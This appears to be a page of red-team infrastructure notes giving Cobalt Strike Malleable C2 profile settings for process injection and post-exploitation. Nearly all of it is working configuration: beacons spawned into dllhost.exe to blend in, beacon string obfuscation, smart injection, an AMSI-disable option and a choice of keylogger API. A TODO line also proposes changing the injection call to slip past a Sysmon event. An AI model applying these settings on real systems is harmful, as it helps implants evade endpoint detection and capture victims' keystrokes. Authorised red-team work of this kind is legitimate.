---
author(s):
  - Userware
tags:
  - helpers
  - red-team-infrastructure
  - cobalt-strike
---
# 05 - Post Exploitation Code Block

## 5.1 - Process Inject Block

TODO: Change the CreateRemoteThread to something else for bypassing sysmon event ID

```
process-inject {
	set userwx "false";
	
	set startrwx "true";
}
```

## 5.2 - Post Exploitation Block (Evasion)

```
post-ex {
	# Spawn the beacons to default windows EXE binaries.
	set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
	set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
	
	# Obfuscate beacon strings
	set obfuscate "true";

	set smartinject "true";
	
	# Disable AMSI feature. To enable it set it to "false"
    set amsi_disable "false";

	# Set a specific windows function for recording keystrokes (select only one of them)
	# set keylogger "SetWindowsHookEx";
	set keylogger "GetAsyncKeyState";
}
```